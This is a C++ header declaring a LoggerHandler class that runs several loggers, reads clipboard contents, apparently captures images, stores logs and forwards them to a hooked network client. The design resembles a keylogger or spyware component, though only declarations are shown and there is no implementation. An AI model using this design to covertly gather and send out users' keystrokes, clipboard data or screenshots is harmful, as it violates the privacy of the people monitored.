#ifndef LOGGERHANDLER_HPP_
 #define LOGGERHANDLER_HPP_

#include <vector>
#include <memory>
#include <string>
#include "Client.hpp"
#include "ALogger.hpp"

class LoggerHandler
{
public:
	LoggerHandler();
	~LoggerHandler();

	void		startLog();
	void		stopLog();
	void		hookClient(Client *client) { _client = client; _client->hookLogger(this); }
	void		writeStatus(bool status);
	
	void		getLog();
	std::string	getClipboard() const;
	void		getImg() const;

	void		addLog(const std::string &log);
	std::string getLogPath(const std::string &file)const;

	template<typename T>
	void Notify(const T &data) const {
		_client->sendLog(data);
	}

	bool									_connectStatus;

private:
	std::vector<std::unique_ptr<ALogger>>	_loggers;
	Client									*_client;
	std::string								_currentLog;
	bool									_active;

	void		sendPacket(const std::string &data)const;
	void		storeLog(const std::string &log)const;
	std::string getStoredLog()const;
};

#endif /* !LOGGERHANDLER_HPP_ */
